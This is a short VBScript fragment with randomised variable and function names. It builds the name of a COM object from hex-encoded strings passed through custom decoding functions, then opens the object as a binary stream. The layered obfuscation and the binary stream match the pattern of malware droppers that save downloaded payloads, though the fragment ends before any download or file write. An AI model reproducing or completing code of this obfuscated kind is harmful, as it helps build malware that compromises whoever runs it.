    Set EteaGsrhKc = CreateObject(DtueNcimLsn(GbsaLd_cHsnlAg("4e6a") & GbsaLd_cHsnlAg("51754c6a744c505130554168514c")))
    EteaGsrhKc.Type = 1 
    
    EteaGsrhKc.Open
